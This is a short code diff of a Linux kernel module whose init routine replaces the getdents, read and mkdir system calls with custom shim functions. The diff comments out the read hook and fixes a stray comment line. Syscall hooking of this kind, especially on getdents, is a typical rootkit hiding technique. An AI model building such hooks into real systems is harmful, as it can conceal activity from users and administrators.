@@ -35,9 +35,9 @@ int init_module() {
 	bootresult = bootprocess();
 	if (bootresult) printk(KERN_INFO "Boot process failed: %d", bootresult);
 
-	shim the syscalls. 
+	//shim the syscalls. 
 	patch(SYS_getdents, getdentsShim);
-	patch(SYS_read, readShim);
+	//patch(SYS_read, readShim);
 	patch(SYS_mkdir, mkdirShim);
 
 	printk(KERN_INFO "Module loaded\n");
